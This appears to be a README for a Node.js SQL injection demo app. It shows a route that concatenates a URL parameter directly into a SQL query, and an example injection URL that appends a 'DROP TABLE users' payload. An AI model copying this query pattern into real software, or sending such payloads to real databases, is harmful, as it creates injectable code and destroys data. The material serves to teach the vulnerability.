# Node SQL Injection demo

## SQL injection vulnerabilities for retrieving entire users table and delete everything

## Example

This URI will list the user from users table with id 8:

```code
http://localhost:3000/users/8
```

The parameter "8" is injected directly into the SQL query like this:

```node
  const id = request.params.id;
  pool.query("SELECT * FROM users WHERE id = " + id..);
```

This makes it possible to run everything that is submitted as an SQL query.
In this example we exploit this fact to drop the users table:

```code
http://localhost:3000/users/8 OR1=1; DROP TABLE users--
```
